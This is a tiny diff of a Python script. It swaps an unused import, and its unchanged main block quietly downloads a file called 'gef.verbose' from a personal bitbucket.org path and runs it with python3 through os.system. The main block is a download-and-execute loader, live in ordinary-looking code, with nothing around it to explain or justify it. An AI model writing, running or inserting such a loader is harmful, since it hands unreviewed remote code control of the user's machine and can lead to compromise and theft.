@@ -1,3 +1,3 @@
-import os, sys,filecmp
+import os, sys,lib2to3
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
